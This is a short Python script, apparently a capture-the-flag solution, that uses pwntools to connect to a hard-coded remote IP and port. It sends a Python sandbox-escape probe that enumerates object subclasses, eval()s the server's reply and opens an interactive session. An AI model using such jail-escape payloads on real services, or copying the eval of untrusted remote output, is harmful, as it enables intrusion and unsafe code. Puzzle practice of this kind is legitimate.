# nc 103.13.206.173 10002
from pwn import *

p = remote("103.13.206.173", 10002)

p.recvline()
# def send(payload):
#   to_send = payload.encode("latin-1")
#   p.sendline(to_send)
  # recv = p.recvline().decode()
  # pprint(recv)
p.sendline(b'print([].__class__.__mro__[1].__subclasses__())')
addr = p.recvline().decode()
addr = eval(addr)

pprint(addr)
# send("[].__class__.__mro__[1].__subclasses__()")

p.interactive()